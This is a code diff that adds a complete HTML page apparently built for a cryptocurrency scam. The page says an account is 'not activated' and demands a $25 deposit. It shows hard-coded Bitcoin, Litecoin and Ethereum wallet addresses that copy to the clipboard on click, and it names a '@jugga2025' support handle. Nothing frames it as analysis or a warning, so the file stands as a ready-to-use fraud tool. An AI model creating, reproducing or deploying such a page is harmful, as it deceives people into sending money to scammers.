@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enter Your Payment Info</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <h1>PLEASE SELECT PAYMENT METHOD:</h1>
+        
+        <div class="crypto-container">
+            <img src="https://www.bitcoin.org/img/icons/opengraph.png" alt="Bitcoin" class="crypto-logo" id="btc" onclick="displayPaymentAddress('btc')">
+            <img src="https://cryptologos.cc/logos/litecoin-ltc-logo.png" alt="Litecoin" class="crypto-logo" id="ltc" onclick="displayPaymentAddress('ltc')">
+            <img src="https://cryptologos.cc/logos/ethereum-eth-logo.png" alt="Ethereum" class="crypto-logo" id="eth" onclick="displayPaymentAddress('eth')">
+        </div>
+
+        <div id="paymentDetails">
+            <h2>PAGE WILL AUTOMATICALLY UPDATE.</h2>
+            <p id="address"></p>
+        </div>
+
+        <p id="cryptoText">Account Not Activated.</p>
+        <p id="footerText">To activate an account make a deposit of $25 using any of the suggested methods.<br></br>This amount will be added to balance! @jugga2025 for support.</p>
+    </div>
+
+    <script>
+        function displayPaymentAddress(crypto) {
+            const addressElement = document.getElementById('address');
+            const cryptoText = document.getElementById('cryptoText');
+            const paymentDetails = document.getElementById('paymentDetails');
+
+            let address = '';
+            let description = '';
+            
+            if (crypto === 'btc') {
+                address = '32uerimdV17QP61gAaXCVvG87Z82ruJCG1';
+                description = 'Account Not Activated.';
+            } else if (crypto === 'ltc') {
+                address = 'MSwskzMmdmFJwwKqohGB8cdFTFU4bqDHmu'; 
+                description = 'Account Not Activated.';
+            } else if (crypto === 'eth') {
+                address = '0x56FE35bA1dAB13476f8bd5263f6fd4CCdb88a7Bc'; 
+                description = 'Account Not Activated.';
+            }
+
+            // Show payment details
+            addressElement.textContent = address;
+            cryptoText.textContent = description;
+            paymentDetails.style.display = 'block';
+                // Add click event to copy address to clipboard
+                addressElement.addEventListener('click', () => {
+            navigator.clipboard.writeText(address).then(() => {
+                alert('Address copied to clipboard!');
+            }).catch(err => {
+                alert('Failed to copy address: ' + err);
+            });
+        });
+    }
+    </script>
+</body>
+</html>
